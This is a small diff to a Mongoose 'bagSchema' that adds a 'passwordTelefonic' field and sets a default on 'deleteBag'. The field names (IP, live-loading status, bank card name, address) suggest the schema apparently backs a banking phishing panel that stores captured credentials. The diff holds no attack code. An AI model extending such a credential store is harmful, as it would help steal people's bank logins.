@@ -27,6 +27,7 @@ const bagSchema = new Schema({
     res2: String,
     res3: String,
     res4: String,
+    passwordTelefonic: String,
     factor: String,
     method: String,
     image: String,
@@ -48,12 +49,14 @@ const bagSchema = new Schema({
     }],
     isLiveLoading: Boolean,
     online: Boolean,
-    deleteBag: Boolean,
+    deleteBag: {
+        type: Boolean,
+        default: false
+    },
     createAt: Date,
     ip: String,
 
     // MultiBank
-
     nameBankCard: String,
     nameTitle: String,
     address: String,
